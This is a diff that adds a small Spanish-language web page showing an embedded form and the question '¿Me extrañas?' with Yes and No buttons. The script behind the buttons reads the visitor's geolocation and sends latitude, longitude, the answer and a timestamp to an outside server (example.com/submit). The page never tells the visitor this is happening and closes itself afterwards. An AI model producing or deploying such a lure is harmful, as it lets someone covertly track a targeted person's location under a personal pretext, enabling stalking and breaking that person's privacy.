@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Mi Formulario</title>
+    <style>
+        body { 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        iframe {
+            width: 100%; 
+            max-width: 640px; 
+            height: 500px;
+        }
+    </style>
+</head>
+<body>
+    <iframe 
+        src="URL_DE_TU_GOOGLE_FORM" 
+        width="640" 
+        height="500" 
+        frameborder="0" 
+        marginheight="0" 
+        marginwidth="0">
+        Cargando…
+    </iframe>
+  <h1>¿Me extrañas?</h1>
+  <button id="btnYes" onclick="sendLocation('Sí')">Sí</button>
+  <button id="btnNo" onclick="sendLocation('No')">No</button>
+  <script>
+    function sendLocation(answer) {
+      // Verifica si la geolocalización está disponible en el navegador
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const { latitude, longitude } = position.coords;
+
+            // Envía la ubicación junto con la respuesta al servidor
+            fetch("https://example.com/submit", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                answer: answer,
+                latitude: latitude,
+                longitude: longitude,
+                timestamp: new Date()
+              })
+            })
+              .then(() => {
+                alert("Gracias por responder 😊");
+                window.close(); // Cierra la ventana del formulario
+              })
+              .catch((error) => {
+                alert("Hubo un problema al enviar tu respuesta.");
+                console.error(error);
+              });
+          },
+          (error) => {
+            alert("No se pudo obtener tu ubicación.");
+            console.error(error);
+          }
+        );
+      } else {
+        alert("Tu navegador no soporta geolocalización.");
+      }
+    }
+  </script>
+</body>
+</html>
